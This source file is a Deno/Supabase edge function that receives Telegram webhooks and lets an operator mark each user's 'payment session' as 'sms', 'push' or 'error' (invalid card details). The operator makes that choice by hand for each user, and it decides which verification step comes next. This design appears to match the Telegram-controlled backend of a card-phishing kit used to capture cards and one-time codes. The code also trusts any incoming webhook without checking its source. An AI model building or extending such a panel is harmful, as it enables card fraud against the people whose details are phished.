import "https://deno.land/x/xhr@0.1.0/mod.ts";
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.4';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramSettings {
  bot_token: string;
  info_chat_id: string;
  form_chat_id: string;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  const supabaseClient = createClient(
    Deno.env.get('SUPABASE_URL') ?? '',
    Deno.env.get('SUPABASE_ANON_KEY') ?? '',
  );

  try {
    const body = await req.json();
    console.log('Telegram webhook received:', JSON.stringify(body, null, 2));

    // Get telegram settings
    const { data: settings } = await supabaseClient
      .from('settings')
      .select('value')
      .eq('key', 'telegram')
      .single();

    if (!settings) {
      console.log('No telegram settings found');
      return new Response('OK', { headers: corsHeaders });
    }

    const telegramSettings = settings.value as TelegramSettings;
    console.log('Using bot token:', telegramSettings.bot_token ? 'Found' : 'Missing');

    // Handle different types of messages/callbacks
    if (body.message) {
      // Handle incoming messages
      const message = body.message;
      console.log('Received message from', message.from?.username || message.from?.first_name, ':', message.text);
      
      // You can add message handling logic here
      // For example, responding to specific commands
    }

    if (body.callback_query) {
      // Handle callback queries from inline keyboards
      const callbackQuery = body.callback_query;
      console.log('Received callback query:', callbackQuery.data);
      console.log('From user:', callbackQuery.from?.username || callbackQuery.from?.first_name);
      
      // Handle payment processing callbacks
      if (callbackQuery.data && callbackQuery.data.startsWith('payment_')) {
        const parts = callbackQuery.data.split('_');
        console.log('Callback data parts:', parts);
        
        if (parts.length >= 3) {
          const userId = parts[1];
          const action = parts[2]; // sms, push, or error
          
          console.log(`Processing payment ${userId} with action ${action}`);
          
          // Update payment session status
          let paymentStatus = 'pending';
          let adminResponse = action;
          
          if (action === 'sms' || action === 'push') {
            paymentStatus = 'approved';
          } else if (action === 'error') {
            paymentStatus = 'rejected';
          }
          
          console.log(`Updating payment session ${userId} to status: ${paymentStatus}, response: ${adminResponse}`);
          
          const { data: updateResult, error: updateError } = await supabaseClient
            .from('payment_sessions')
            .update({
              payment_status: paymentStatus,
              admin_response: adminResponse
            })
            .eq('user_id', userId)
            .select();
          
          if (updateError) {
            console.error('Error updating payment session:', updateError);
          } else {
            console.log(`Payment session updated successfully:`, updateResult);
          }
          
          // Send confirmation message back to admin
          const confirmationMessages = {
            sms: '✅ Payment approved for SMS verification',
            push: '✅ Payment approved for Push notification', 
            error: '❌ Payment rejected - Invalid card details'
          };
          
          console.log('Sending callback answer...');
          const callbackResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              callback_query_id: callbackQuery.id,
              text: confirmationMessages[action as keyof typeof confirmationMessages] || 'Action processed'
            })
          });
          
          const callbackResult = await callbackResponse.json();
          console.log('Callback answer result:', callbackResult);
          
          // Edit the original message to show it's been processed
          console.log('Editing original message...');
          const currentTime = new Date().toLocaleString('en-US', {
            year: 'numeric',
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            timeZone: 'UTC'
          });
          
          const adminName = callbackQuery.from?.first_name || callbackQuery.from?.username || 'Admin';
          const actionEmoji = {
            sms: '📱',
            push: '🔔',
            error: '❌'
          };
          
          const newMessageText = callbackQuery.message.text + 
            `\n\n${actionEmoji[action as keyof typeof actionEmoji]} *PROCESSED by ${adminName}*\n` +
            `⏰ *Time:* ${currentTime} UTC\n` +
            `✅ *Action:* ${confirmationMessages[action as keyof typeof confirmationMessages]}`;
          
          const editResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: callbackQuery.message.chat.id,
              message_id: callbackQuery.message.message_id,
              text: newMessageText,
              parse_mode: 'Markdown'
              // No reply_markup = buttons are removed
            })
          });
          
          const editResult = await editResponse.json();
          console.log('Edit message result:', editResult);
        } else {
          console.log('Invalid callback data format:', callbackQuery.data);
        }
      } else {
        console.log('Non-payment callback data:', callbackQuery.data);
      }
    }

    console.log('Webhook processing completed successfully');
    return new Response('OK', { headers: corsHeaders });
  } catch (error) {
    console.error('Error in telegram webhook:', error);
    return new Response('Error', { 
      status: 500, 
      headers: corsHeaders 
    });
  }
});